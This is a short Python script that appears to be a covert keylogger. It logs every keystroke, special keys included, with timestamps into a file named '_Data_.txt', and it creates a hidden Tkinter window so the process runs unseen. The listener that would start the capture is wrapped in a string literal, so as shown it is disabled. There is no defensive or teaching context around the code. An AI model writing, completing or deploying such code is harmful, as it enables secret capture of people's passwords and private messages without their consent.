import pynput.keyboard
import logging
import tkinter as tk
import os




log_file = "_Data_.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

"""def on_release(key):
    if key == pynput.keyboard.Key.alt:
        return False

print("[*] Press 'Esc' to stop and exit.")
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()"""





root = tk.Tk()

root.withdraw()

root.mainloop()
